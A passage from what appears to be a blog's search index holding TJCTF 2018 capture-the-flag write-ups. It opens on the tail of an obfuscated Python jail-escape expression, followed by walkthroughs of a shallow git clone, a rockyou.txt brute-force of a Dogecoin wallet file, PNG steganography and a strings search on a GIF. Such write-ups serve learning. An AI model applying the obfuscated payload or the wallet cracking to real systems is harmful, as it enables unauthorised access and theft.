;[])&lt;&lt;({}&lt;[]))]%~((~(((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))")tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}Phew! Got it, finally! The flag was : tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}After thoughtsI maybe made it sound easy or quick writing this, but it actually took me a few hours to figure this all out. As it was my first time, I definitly needed some help and advices, and that’s where Highsenburger69 came handy. Shout out to you, lovely bastard! :heart:]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> misc </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Huuuuuge]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Huuuuuge/</url>
      <content type="text"><![CDATA[ChallengeDon’t think too deep.104.154.187.226/huuuuuge[25 points]Written by Alaska47Initial thoughtsUh. They’re giving us an IP address with an extension (/xxx) which probably means it’s web. But then, why classify this challenge as misc’?Let’s find out.ExploitationFirst of all, let’s fire up nmap and gather information about 104.154.187.226.PORT     STATE  SERVICE VERSION22/tcp   open   ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)| ssh-hostkey: |   2048 25:97:23:e0:26:26:07:2e:f6:38:20:90:ce:39:44:96 (RSA)|   256 66:2e:64:31:21:83:68:03:2b:05:30:05:7a:59:72:df (ECDSA)|_  256 25:61:dd:51:b8:43:76:47:ba:96:16:fe:cd:09:e0:04 (ED25519)80/tcp   closed http5901/tcp closed vnc-19418/tcp open   git?Interesting. It’s not a web server after all. I immediately thought that this git opened port was looking weird. Well, let’s try to interact with it.~# git clone 104.154.187.226/huuuuugefatal: repository '104.154.187.226/huuuuuge' does not existErr. Silly me. I forgot the extension, plus : it’s not a web server, so I gotta tell my git where to look and HOW to look.~# git clone git://104.154.187.226/huuuuugeCloning into 'huuuuuge'...remote: Counting objects: 309, done.remote: warning: suboptimal pack - out of memoryremote: fatal: Out of memory, malloc failed (tried to allocate 104857601 bytes)remote: aborting due to possible repository corruption on the remote side.fatal: early EOFfatal: index-pack failedGod damn, this thing is massive! Wait… Challenge name’s Huuuuuge… I see what they did here…Let’s look at git clone’s manual :--depth &lt;depth&gt;Create a shallow clone with a history truncated to the specified number of commits. Implies --single-branch unless --no-single-branch is given to fetch the histories near the tips of all branches. If you want to clone submodules shallowly, also pass --shallow-submodules.Interesting… Let’s try something then, just to see what comes out!~# git clone --depth 1 git://104.154.187.226/huuuuugeCloning into 'huuuuuge'...remote: Counting objects: 3, done.remote: Total 3 (delta 0), reused 0 (delta 0)Receiving objects: 100% (3/3), done.Uh, uh! We got the first line. Let’s open it and see what lies for us there.~# cd huuuuuge/~/huuuuuge# lsflag.txtHow nice of them to give us a flag like that! You gotta love TJCTF.The flag was : tjctf{this_fl4g_1s_huuuuuge}After thoughtsVery interesting challenge as I never had encountered this case before of a “too big to clone” git repo. I really like challenges that make you learn new things, and this includes the ones that make you read a command’s manual.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> misc </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - We Will Rock You]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-We-Will-Rock-You/</url>
      <content type="text"><![CDATA[ChallengeHelp! I lost the password to my Dogecoin wallet. I had like 10 Dogecoin in there. If you get the password, you’ll get the flag! Flag format: tjctf{password}[75 points]Written by Alaska47Initial thoughtsSeeing the name of the challenge, I immediately thought about the infamous rockyou.txt list of passwords. For those of you who don’t know it, it’s this huge list of passwords that was created out of real, leaked passwords.It’s natively present in Kali, check /usr/share/wordlists and you’ll find a rockyou.txt.gz :)So I assumed I’d have to bruteforce this wallet in order to retrieve the password. I googled for “wallet bruteforce” and found glv2’s Github magic thingy.ExploitationFirst off, let’s clone this github repo.~# git clone https://github.com/glv2/bruteforce-walletLet’s install the dependencies required :~# apt install libdb-dev libssl-dev -yLet’s then try to install it following the README’s instructions.~# cd bruteforce-wallet &amp;&amp; ./autogen.sh./autogen.sh: 6: ./autogen.sh: autoreconf: not foundOops! Seems I need to install a package first.~# apt-get install autoconf~# ./autogen.shconfigure.ac:6: installing './compile'configure.ac:2: installing './install-sh'configure.ac:2: installing './missing'Makefile.am: installing './depcomp'Then a ./configure, make and make install and we’re good! Now, let’s use our new little tool :3~# bruteforce-wallet -t 6 -f /root/Documents/rockyou.txt 9d7e6203fb6e2c14646c63bea94e48001b9317c86bec229c3e063904a168dfad_wallet.datWarning: using dictionary mode, ignoring options -b, -e, -l, -m and -s. Tried passwords: 59Tried passwords per second: 59,000000Last tried password: samantha Password found: tinkerbellGot it! Password is “tinkerbell”, hereby flag is : tjctf{tinkerbell}After thoughtsA very basic challenge worth a lot of points compared to other ones in this TJCTF. Still, I enjoyed the five minutes it took me, as I never had to bruteforce a coin-wallet before. Valuable experience!]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> forensics </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Weird Logo]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Weird-Logo/</url>
      <content type="text"><![CDATA[ChallengeThis company’s logo stands in contrast of those of other leading edge tech companies with its poor design[5 points]Written by jfrucht25Initial thoughtsHaving a static .png image with this little amount of points rewarded means it won’t be tough.ExploitationLet’s start with the basics. The “file” command tells us it is indeed a .png. The “binwalk” and “strings” commands give us nothing interesting. Next step? Stegsolve!You can install it here.Here is our beautiful logo :And here is what we can find with just a few switches to the right :Flag : tjctf{in_plain_sight}After thoughtsNot much. This is the very basic of steganography. I’ve encountered it dozens of times in past CTFs.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> forensics </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Trippy]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Trippy/</url>
      <content type="text"><![CDATA[ChallengeNo description[5 points]Written by Alaska47Initial thoughtsSo, we have no description and a gif file. All of this for little to no points. This should be quick.Exploitation~# wget https://static.tjctf.org/be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif ~# strings be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif | grep tjctftjctf{w0w}Meh.Flag : tjctf{w0w}After thoughtsNot much.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> misc </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
</search>
